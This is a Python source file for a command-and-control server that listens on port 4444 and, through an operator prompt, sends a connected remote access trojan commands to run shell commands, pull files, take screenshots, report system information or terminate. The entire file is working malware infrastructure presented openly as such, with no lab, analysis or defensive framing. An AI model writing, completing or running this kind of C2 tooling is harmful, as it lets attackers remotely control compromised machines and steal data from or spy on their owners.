import socket
import json
import struct
import threading
import sys

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        
    def handle_client(self, conn, addr):
        print(f"[+] Connection from {addr}")
        
        try:
            while True:
                # Receive command from operator
                cmd = input(f"C2/{addr}> ").strip()
                
                if cmd == "exit":
                    break
                elif cmd == "help":
                    print("Commands: shell, download, upload, screenshot, info, kill")
                    continue
                
                # Send command to RAT
                if cmd.startswith("shell "):
                    cmd_data = {"type": "shell", "command": cmd[6:]}
                elif cmd.startswith("download "):
                    cmd_data = {"type": "download", "path": cmd[9:]}
                elif cmd == "screenshot":
                    cmd_data = {"type": "screenshot"}
                elif cmd == "info":
                    cmd_data = {"type": "info"}
                elif cmd == "kill":
                    cmd_data = {"type": "kill"}
                else:
                    print("Unknown command")
                    continue
                
                # Send command
                self.send_json(conn, cmd_data)
                
                # Receive response
                response = self.receive_json(conn)
                if response:
                    print(json.dumps(response, indent=2))
                    
        except Exception as e:
            print(f"[-] Client {addr} disconnected: {e}")
        finally:
            conn.close()
    
    def send_json(self, conn, data):
        json_data = json.dumps(data).encode('utf-8')
        length = struct.pack('!I', len(json_data))
        conn.sendall(length + json_data)
    
    def receive_json(self, conn):
        try:
            length_data = conn.recv(4)
            if not length_data:
                return None
            length = struct.unpack('!I', length_data)[0]
            json_data = conn.recv(length)
            return json.loads(json_data.decode('utf-8'))
        except:
            return None
    
    def run(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        
        try:
            while True:
                conn, addr = server.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
        finally:
            server.close()

if __name__ == "__main__":
    server = C2Server()
    server.run()
